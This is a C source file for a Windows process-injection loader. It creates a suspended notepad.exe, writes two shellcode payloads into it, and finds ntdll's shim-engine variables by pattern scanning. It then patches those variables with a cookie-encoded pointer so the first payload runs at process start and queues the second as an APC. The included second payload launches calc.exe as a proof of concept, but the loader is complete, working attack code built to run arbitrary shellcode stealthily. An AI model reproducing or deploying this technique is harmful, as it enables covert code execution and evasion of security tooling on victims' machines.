#include <windows.h>
#include <stdio.h>

// gcc -s -fmerge-all-constants loader.c -o loader.exe
/*
    - Create a child process as suspended
    - Write payloads into the child process memory (two parts)
    - locate in ntdll.dll : g_shimsEnabled (.data) + g_pfnSEDllLoaded (.mrdata)
        - g_shimsEnabled is a bool used in thoses functions XREFS(13): LdrpUnloadNode, LdrpAppCompatRedirect, LdrpMapDllSearchPath, LdrpSendPostSnapNotifications, LdrpHandleProtectedDelayload, LdrpInitializeProcess, ...        - g_pfnSEDllLoaded is a function pointer used in LdrpSendPostSnapNotification
        - g_pfnSEDllLoaded is a pfn used in thoses functions XREFS(4) : LdrpSendPostSnapNotifications, LdrpDynamicShimModule, LdrpGetShimEngineInterface, LdrpLoadShimEngine
    - patch g_shimsEnabled to 1 and g_pfnSEDllLoaded @ payload1_bin
    - Resume the child process 
    - First paylod detonated by ntdll!LdrpSendPostSnapNotification
    * - First payload sets g_ShimsEnabled to 0 and register the second payload as queued APC
    - Second payload detonated by ntdll.dll!NtTestAlert that empty the APC queue

*/
#define PAGE_ALIGN_UP(size) (((size) + 4095) & ~4095)

unsigned char payload1_bin[] = {
  0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x48, 0x8b, 0x05, 0x3a, 0x00,
  0x00, 0x00, 0xc6, 0x00, 0x00, 0x48, 0x83, 0xec, 0x28, 0x48, 0xc7, 0xc1,
  0xfe, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x15, 0x2d, 0x00, 0x00, 0x00, 0x4d,
  0x31, 0xc0, 0x4d, 0x31, 0xc9, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89,
  0x44, 0x24, 0x20, 0x48, 0x8b, 0x05, 0x1e, 0x00, 0x00, 0x00, 0xff, 0xd0,
  0x48, 0x83, 0xc4, 0x28, 0x41, 0x59, 0x41, 0x58, 0x5a, 0x59, 0x58, 0xc3,
  0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb,
  0xbb, 0xbb, 0xbb, 0xbb, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};
unsigned int payload1_bin_len = 96;
unsigned char PAYLOAD_2[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
unsigned int payload2_bin_len = 277;

typedef BOOL(WINAPI* PFN_SetProcessValidCallTargets)(
    HANDLE                hProcess,
    PVOID                 VirtualAddress,
    SIZE_T                RegionSize,
    ULONG                 NumberOfOffsets,
    PCFG_CALL_TARGET_INFO OffsetInformation
);

BOOL CreateChildProc(LPCWSTR targetPath, PROCESS_INFORMATION* pi) {
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    
    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));

    BOOL status = CreateProcessW(
        targetPath,
        NULL,               
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,   // Creation flags
        NULL,
        NULL,
        &si,                // Pointer to STARTUPINFO
        pi                  // Pointer to PROCESS_INFORMATION
    );

    if (!status) {
        printf("[-] CreateProcessW failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

VOID FindShimsvariables(HANDLE hProcess, LPVOID* g_shimsEnabled, LPVOID* g_pfnSEDllLoaded) {
    *g_shimsEnabled = NULL;
    *g_pfnSEDllLoaded = NULL;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    ULONG_PTR moduleBase = (ULONG_PTR)hNtdll;
    
    // Find .text section
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return;

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    PBYTE textSection = NULL;
    DWORD textSize = 0;

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // On cherche le segment de code exécutable
        if (memcmp(sectionHeader[i].Name, ".text", 5) == 0) {
            textSection = (PBYTE)(moduleBase + sectionHeader[i].VirtualAddress);
            textSize = sectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textSection || !textSize) return;

    // Scan for g_pfnSEDllLoaded
    // Pattern : 8B C2 48 8B 3D E8 C7 13 00 (from LdrpLoadShimEngine)
    for (DWORD i = 0; i < textSize - 9; i++) {
        PBYTE ptr = textSection + i;
        if (ptr[0] == 0x8B && ptr[1] == 0xC2 && ptr[2] == 0x48 && 
            ptr[3] == 0x8B && ptr[4] == 0x3D) 
        {
            // 32-bits offset (rip-relative)
            INT32 offset = *(PINT32)(ptr + 5);
            ULONG_PTR next_rip = (ULONG_PTR)(ptr + 9);
            
            // RIP + addr == 64bit address of g_pfnSEDllLoaded
            *g_pfnSEDllLoaded = (LPVOID)(next_rip + offset);
            break;
        }
    }

    // Scan for g_shimsEnabled
    // Pattern : 0F 57 C0 44 38 3D 5F AE 19 00 (from : LdrpAppCompatRedirect)
    for (DWORD i = 0; i < textSize - 10; i++) {
        PBYTE ptr = textSection + i;
        if (ptr[0] == 0x0F && ptr[1] == 0x57 && ptr[2] == 0xC0 && 
            ptr[3] == 0x44 && ptr[4] == 0x38 && ptr[5] == 0x3D) 
        {
            INT32 offset = *(PINT32)(ptr + 6);
            ULONG_PTR next_rip = (ULONG_PTR)(ptr + 10);
            
            *g_shimsEnabled = (LPVOID)(next_rip + offset);
            break;
        }
    }
}

// Helper function to scan the shellcode array and patch 8-byte placeholders
BOOL PatchPlaceholder(UCHAR* payload, SIZE_T payloadSize, ULONG64 placeholder, PVOID value) {
    for (SIZE_T i = 0; i <= payloadSize - sizeof(ULONG64); i++) {
        if (*(ULONG64*)(&payload[i]) == placeholder) {
            *(PVOID*)(&payload[i]) = value;
            return TRUE;
        }
    }
    return FALSE;
}

#define KUSER_SHARED_DATA_ADDRESS 0x7FFE0000
#define FIXED_COOKIE_OFFSET 0x330

ULONG GetSystemPointerCookie() {
    // 0x7FFE0330
    ULONG* pCookieAddress = (ULONG*)(KUSER_SHARED_DATA_ADDRESS + FIXED_COOKIE_OFFSET);
    return *pCookieAddress;
}

LPVOID EncodeSystemPointer(LPVOID ptr) {
    ULONG cookie = GetSystemPointerCookie();
    ULONGLONG ptrVal = (ULONGLONG)ptr;

    // Alg : (Cookie XOR Ptr) ROTR (Cookie AND 0x3F)
    return (LPVOID)_rotr64(cookie ^ ptrVal, cookie & 0x3F);
}

int main(int argc, char** argv) {
    PROCESS_INFORMATION pi;

    if (CreateChildProc(L"C:\\Windows\\System32\\notepad.exe", &pi)) {
        printf("[+] Child process created successfully.\n");
    } else {
        printf("[-] Failed to create child process.\n");
        return 1;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    DWORD dwProcessId = pi.dwProcessId;

    LPVOID pPayload1 = VirtualAllocEx(hProcess, NULL, payload1_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID pPayload2 = VirtualAllocEx(hProcess, NULL, payload2_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Wasted so much time trying to find why the Access Violation
    // Thx to https://github.com/0xNinjaCyclone i saw the problem was the cookie encoding of the pointer
    LPVOID pEncodedPayload1 = EncodeSystemPointer(pPayload1);

    printf("Payloads space allocated in child process memory\n");
    printf("Payload 1 address: 0x%p (Cookie encoded 0x%p)\n", pPayload1, pEncodedPayload1);
    printf("Payload 2 address: 0x%p\n", pPayload2);



/*
        BOOL SetProcessValidCallTargets(
          [in]      HANDLE                hProcess,
          [in]      PVOID                 VirtualAddress,
          [in]      SIZE_T                RegionSize,
          [in]      ULONG                 NumberOfOffsets,
          [in, out] PCFG_CALL_TARGET_INFO OffsetInformation
        );

    HMODULE hKernelbase = GetModuleHandleA("kernelbase.dll");
    PFN_SetProcessValidCallTargets pSetProcessValidCallTargets = (PFN_SetProcessValidCallTargets)GetProcAddress(hKernelbase, "SetProcessValidCallTargets");
    
    printf("[+] SetProcessValidCallTargets address: %p\n", pSetProcessValidCallTargets);

    CFG_CALL_TARGET_INFO cfgPayload1 = { 0 };
    cfgPayload1.Offset = 0; 
    cfgPayload1.Flags  = CFG_CALL_TARGET_VALID;

    SIZE_T regionSize1 = PAGE_ALIGN_UP(payload1_bin_len);

    BOOL bCfg1 = pSetProcessValidCallTargets(hProcess, pPayload1, regionSize1, 1, &cfgPayload1);

    CFG_CALL_TARGET_INFO cfgPayload2 = { 0 };
    cfgPayload2.Offset = 0;
    cfgPayload2.Flags  = CFG_CALL_TARGET_VALID;

    SIZE_T regionSize2 = PAGE_ALIGN_UP(payload2_bin_len);

    BOOL bCfg2 = pSetProcessValidCallTargets(hProcess, pPayload2, regionSize2, 1, &cfgPayload2);

    if (!bCfg1 || !bCfg2) {
        printf("[-] SetProcessValidCallTargets failed. Error: %lu\n", GetLastError());
        return 1;
    }

    if (!pPayload1 || !pPayload2) { 
        printf("[-] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        return 1;
    }
*/
    PBYTE pg_shimsEnabled = NULL;
    LPVOID pg_pfnSEDllLoaded = NULL;
    
    FindShimsvariables(hProcess, (LPVOID*)&pg_shimsEnabled, &pg_pfnSEDllLoaded);

    if (!pg_shimsEnabled || !pg_pfnSEDllLoaded) {
        printf("[-] Failed to locate g_shimsEnabled or g_pfnSEDllLoaded.\n");
        return 1;
    }
    printf("[+] g_shimsEnabled address: %p\n", pg_shimsEnabled);
    printf("[+] g_pfnSEDllLoaded address: %p\n", pg_pfnSEDllLoaded);

    PatchPlaceholder((UCHAR*)payload1_bin, payload1_bin_len, 0xAAAAAAAAAAAAAAAA, pg_shimsEnabled);
    PatchPlaceholder((UCHAR*)payload1_bin, payload1_bin_len, 0xBBBBBBBBBBBBBBBB, pPayload2);
    PatchPlaceholder((UCHAR*)payload1_bin, payload1_bin_len, 0xCCCCCCCCCCCCCCCC, GetProcAddress(hNtdll, "NtQueueApcThread"));

    printf("[+] Payload 1 patched with pg_shimsEnabled, pPayload2, and NtQueueApcThread addresses.\n");

    WriteProcessMemory(hProcess, pPayload1, payload1_bin, payload1_bin_len, NULL);
    WriteProcessMemory(hProcess, pPayload2, PAYLOAD_2, payload2_bin_len, NULL);

    printf("[+] Shellcodes (Payload 1 & Payload 2) written to child process memory.\n");

    VirtualProtectEx(hProcess, pPayload1, payload1_bin_len, PAGE_EXECUTE_READ, NULL);
    VirtualProtectEx(hProcess, pPayload2, payload2_bin_len, PAGE_EXECUTE_READ, NULL);

    WriteProcessMemory(hProcess, pg_shimsEnabled, &(BYTE){1}, sizeof(BYTE), NULL);
    WriteProcessMemory(hProcess, pg_pfnSEDllLoaded, &pEncodedPayload1, sizeof(LPVOID), NULL);

    printf("[+] g_shimsEnabled set to 1 and g_pfnSEDllLoaded patched with pPayload1 address.\n");

    // at this point the payload 1 will detonate when resume
    // the payload 1 will set g_shimsEnabled to 0 and register the payload 2 as queued APC
    // the payload 2 will detonate when the APC queue will be emptied by NtTestAlert

    ResumeThread(hThread);
    printf("[+] Child process resumed. Waiting for it to finish...\n");

    WaitForSingleObject(hProcess, INFINITE);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}